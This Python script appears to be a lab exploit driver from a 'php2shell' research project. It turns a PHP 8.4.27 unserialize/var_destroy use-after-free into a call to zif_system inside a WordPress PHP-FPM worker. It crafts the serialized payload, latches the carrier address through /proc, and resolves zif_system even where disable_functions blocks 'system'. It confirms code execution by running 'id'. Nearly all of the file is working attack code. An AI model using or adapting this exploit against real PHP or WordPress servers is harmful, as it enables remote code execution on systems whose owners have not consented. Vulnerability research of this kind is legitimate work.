#!/usr/bin/env python3
"""var_destroy terminal call under FPM + WordPress (lab-only).

R4: the same forged-reference -> forged-object -> dtor_obj chain as the
mod_php proof, running inside a real WordPress/FPM worker on the patched
8.4.27 build.

The WordPress mu-plugin (lab-wp-zendmm/uaf-harness/vd-harness.php) builds the
carrier and latches its address (the request sleeps while this driver scans
/proc and writes /out/vd_addr). The dtor target is zif_system when --zif is
given, otherwise the 0x41 sentinel (proves the indirect call without needing a
symbol address).

Lab-only; fixed benign command `id>/tmp/vd 2>&1`.
"""
import argparse
import os
import socket
import sys
import threading
import time
from urllib.parse import urlencode

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from php2shell import profiles  # noqa: E402

MAGIC = b"VDUAFMAGIC0xdead"
MAGIC_OFF = 0x800
CONTAINER = "php2shell-wp-vd-8427"


def sh(cmd, timeout=120):
    import subprocess
    return subprocess.run(["docker", "exec", CONTAINER, "sh", "-c", cmd],
                          capture_output=True, text=True, timeout=timeout)


def worker_pid():
    # prefer a real FPM child (PPid == 1 in the container); never the master.
    # NOTE: stock FPM (pm.max_requests=0) moves the absolute carrier between
    # requests -- use the per-request latch (--resolve-zif), not a fixed delta.
    r = sh("for p in /proc/[0-9]*; do c=$(cat $p/comm 2>/dev/null); "
           "pp=$(awk '/^PPid:/{print $2}' $p/status 2>/dev/null); "
           "[ \"$c\" = php-fpm ] && [ \"$pp\" = 1 ] && echo ${p#/proc/}; "
           "done | sort -n | tail -1")
    pid = r.stdout.strip()
    if not pid:
        r = sh("for p in /proc/[0-9]*; do c=$(cat $p/comm 2>/dev/null); "
               "[ \"$c\" = php-fpm ] && echo ${p#/proc/}; done | sort -n | tail -1")
        pid = r.stdout.strip()
    return int(pid) if pid else 0


def fpm_base(pid):
    r = sh(f"grep -m1 'php-fpm' /proc/{pid}/maps")
    line = r.stdout.strip()
    return int(line.split("-", 1)[0], 16) if line else 0


def zif_from_fpm_offset(pid):
    """Fallback when the pool sets disable_functions=system: the handler is
    no longer in EG(function_table), so use the build's fixed fpm offset."""
    r = sh("php -r 'echo PHP_VERSION;'")
    prof = profiles.find(php_version=r.stdout.strip() or None, arch="aarch64")
    off = prof.get("zif_system_fpm") if prof else None
    base = fpm_base(pid)
    if not off or not base:
        return 0
    print(f"    function-table lookup failed; fpm base {base:#x} + "
          f"zif_fpm {off:#x}")
    return base + off


def http_post(host, port, path, body, timeout=40):
    s = socket.create_connection((host, port), timeout=timeout)
    req = (f"POST {path} HTTP/1.1\r\nHost: x\r\n"
           f"Content-Type: application/x-www-form-urlencoded\r\n"
           f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n").encode() + body
    s.sendall(req)
    s.settimeout(timeout)
    out = b""
    try:
        while True:
            d = s.recv(65536)
            if not d:
                break
            out += d
    except socket.timeout:
        pass
    s.close()
    return out


def payload():
    n = 1016
    p = f"a:{n + 2}:{{"
    p += "i:0;N;" * n
    p += 'i:99999;O:12:"WP_VD_Gadget":0:{}'
    p += "i:99999;i:42;}"
    return p


def resolve_zif(host, port, outdir):
    """Resolve zif_system from a live FPM worker during a throwaway latch
    request (the function table is only populated while a request runs)."""
    addr_file = os.path.join(outdir, "vd_addr")
    for _attempt in range(3):
        body = urlencode({"d": "i:0;", "zif": "0x0"}).encode()
        holder = {}

        def req():
            holder["resp"] = http_post(host, port, "/index.php?vd=1&latch=1", body)

        try:
            os.remove(addr_file)
        except FileNotFoundError:
            pass
        t = threading.Thread(target=req, daemon=True)
        t.start()
        zif = 0
        for _ in range(20):
            time.sleep(0.5)
            pid = worker_pid()
            if not pid:
                continue
            r = sh(f"php /var/www/html/vd_zif.php {pid}")
            for tok in r.stdout.split():
                if tok.startswith("zif_system="):
                    zif = int(tok.split("=", 1)[1], 16)
            if zif:
                break
        # release the throwaway latch request
        try:
            with open(addr_file, "w") as fh:
                fh.write("1000")
        except OSError:
            pass
        t.join(timeout=10)
        if zif:
            return zif
        # disable_functions removed 'system' from the function table: fall
        # back to the build's fixed fpm handler offset.
        zif = zif_from_fpm_offset(worker_pid())
        if zif:
            return zif
    return 0


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", default="127.0.0.1:18096")
    ap.add_argument("--out-dir", default=os.path.join(
        os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
        "lab-wp-zendmm", "out"))
    ap.add_argument("--zif", type=lambda x: int(x, 0), default=0,
                    help="zif_system address (0 = 0x41 sentinel control)")
    ap.add_argument("--no-objects", action="store_true",
                    help="control: sink uses allowed_classes=false")
    ap.add_argument("--resolve-zif", action="store_true",
                    help="resolve zif_system from the live FPM worker")
    args = ap.parse_args()

    host, _, port = args.target.partition(":")
    port = int(port or 80)
    if args.resolve_zif and not args.zif:
        args.zif = resolve_zif(host, port, args.out_dir)
        print(f"    resolved zif_system {args.zif:#x}" if args.zif else "    zif resolve failed")
    body = urlencode({"d": payload(), "zif": hex(args.zif),
                      "allowed": "0" if args.no_objects else "1"}).encode()

    sh("rm -f /tmp/vd /tmp/vd_wp_stage")
    try:
        os.remove(os.path.join(args.out_dir, "vd_addr"))
    except FileNotFoundError:
        pass

    print("[*] var_destroy under FPM/WordPress (8.4.27)")
    print(f"    target {args.target}  dtor={hex(args.zif) if args.zif else '0x41 sentinel'}")
    holder = {}

    def req():
        holder["resp"] = http_post(host, port, "/index.php?vd=1&latch=1", body)

    t = threading.Thread(target=req, daemon=True)
    t.start()
    time.sleep(2.0)
    pid = worker_pid()
    print(f"    fpm worker pid={pid}")
    if not pid:
        print("[!] no php-fpm worker")
        return 2
    r = sh(f"php /var/www/html/vd_scan.php {pid} {(MAGIC + MAGIC).hex()}")
    found = r.stdout.strip()
    if not found:
        print(f"[!] latch scan failed: {r.stderr.strip()}")
        return 2
    addr = int(found, 16) - MAGIC_OFF
    with open(os.path.join(args.out_dir, "vd_addr"), "w") as fh:
        fh.write(f"{addr:x}")
    print(f"    latched carrier {addr:#x}")
    t.join(timeout=40)
    resp = holder.get("resp", b"")
    status = resp.split(b"\r\n", 1)[0].decode("latin1", "replace") if resp else "<none>"
    print(f"    response: {status}")

    time.sleep(1.0)
    stage = sh("cat /tmp/vd_wp_stage 2>/dev/null").stdout.strip()
    if stage:
        print(f"    stage: {stage}")
    if args.zif:
        proof = sh("cat /tmp/vd 2>/dev/null").stdout.strip()
        print(f"    proof: {proof!r}")
        return 0 if "uid=" in proof else 1

    # sentinel control: the worker should die at 0x4141414141414141
    time.sleep(1.0)
    pid2 = worker_pid()
    print(f"    worker after request: pid={pid2} (was {pid})")
    print(f"    worker reset (sentinel dtor reached): {pid2 != pid}")
    return 0 if pid2 != pid else 1


if __name__ == "__main__":
    raise SystemExit(main())
